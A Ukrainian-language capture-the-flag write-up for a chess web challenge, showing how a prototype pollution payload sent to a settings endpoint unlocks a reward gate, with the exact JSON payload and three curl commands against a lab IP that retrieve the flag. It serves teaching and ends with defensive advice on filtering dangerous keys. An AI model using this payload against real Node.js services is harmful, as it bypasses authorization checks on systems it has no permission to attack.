
# Fools Mate, Revenge - Do you have what it takes to defeat me and claim your prize?

Складність: Medium

Ціль: 10.112.179.82

## 1. Чесна гра (І де нас блокують)
   
   Якщо ми просто завантажимо гру і зробимо хід турою `a1 -> a8`, гра покаже повідомлення: **"Checkmate! No reward for you."**
   Якщо відкрити інструменти розробника в браузері (F12) на вкладці **Network** і подивитися на відповідь сервера (JSON), ми побачимо причину блокування:
```json
{
  "ok": true,
  "status": "checkmate",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

   Що це означає?
   Сервер чесно зафіксував мат (`"status": "checkmate"`), але він має «ворота з нагородою» (reward gate). Сервер перевіряє параметр `session.config.unlocked`. Оскільки гра розрахована на злам, за замовчуванням цей параметр дорівнює `false` або взагалі не існує (`undefined`). Брама зачинена, прапора немає.

## 2. Пошук шпарини (Вразливість)

   Нам потрібно зробити так, щоб сервер повірив, ніби `unlocked` дорівнює `true`.
   В грі є панель налаштувань користувача (Preferences), яка при збереженні відправляє запит на ендпоінт `POST /api/settings`. Туди йде звичайний JSON:
```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180
}
```

   Коли сервер приймає цей JSON, він використовує функцію об'єднання об'єктів (`merge`), щоб оновити налаштування нашої сесії. І ця функція написана небезпечно — вона приймає будь-які ключі без перевірки. Це класична вразливість **Prototype Pollution (Забруднення прототипу)** в Node.js / JavaScript.

## 3. Як працює злам?

   У JavaScript кожен об'єкт наслідує властивості від свого «батька» — `Object.prototype` (Головний шаблон додатка).
   Якщо ми відправимо в налаштування ось такий шкідливий JSON-рядок:
```json
{"constructor":{"prototype":{"unlocked":true}}}
```

   Неуважна функція `merge` на сервері почне копіювати цей об'єкт і випадково пропише нове правило прямо в «мізки» додатка:
```js
Object.prototype.unlocked = true;
```

   **Результат:** Тепер абсолютно КОЖЕН об'єкт у пам'яті сервера, який не має власного параметра `unlocked`, автоматично почне повертати `true`, бо він бере це значення з глобального шаблону!

## 4. Покрокова експлуатація (Exploitation)
   Атаку можна провести повністю через термінал за допомогою трьох команд `curl` (використовуючи файл `cookies.txt` для збереження нашої сесії).

   4.1. Скидаємо дошку та створюємо сесію
```bash
└─$ curl -s -c cookies.txt -b cookies.txt -X POST http://10.112.179.82:3000/api/reset -H "Content-Length: 0"
```

   4.2. «Отруюємо» сервер через налаштування (Вмикаємо `unlocked`)
   Надсилаємо наш пейлоад на вразливий ендпоінт `/api/settings`:
```bash
└─$ curl -s -c cookies.txt -b cookies.txt -X POST http://10.112.179.82:3000/api/settings -H "Content-Type: application/json" -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"unlocked":true}}}'
```

   Тепер сервер "забруднений". Глобальний прототип отримав `unlocked: true`.

   4.3. Робимо хід і забираємо прапор
   Тепер відправляємо наш переможний хід на `/api/move`:
```bash
└─$ curl -s -c cookies.txt -b cookies.txt -X POST http://10.112.179.82:3000/api/move -H "Content-Type: application/json" -d '{"from":"a1","to":"a8"}'
{"ok":true,"move":"a1a8","fen":"R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1","status":"checkmate","turn":"b","winner":"white","flag":"THM{pr0t0_p0lluted_th3_r3f3r33}"} 
```

   Що відбувається в цей момент на сервері?
   Сервер бачить мат і йде перевіряти: `if (session.config.unlocked)`. В самому об'єкті `session.config` цього параметра все ще немає. Але JavaScript дивиться вище — в наш забруднений прототип, знаходить там `true` і каже серверу: «Все окей, доступ дозволено!».

 ## Висновок
   Ніколи не можна довіряти JSON-даним від користувача наосліп. Завжди потрібно фільтрувати такі ключі як `__proto__`, `constructor` та `prototype`, або використовувати перевірені безпечні бібліотеки для злиття об'єктів (наприклад, актуальні версії `lodash.merge`).
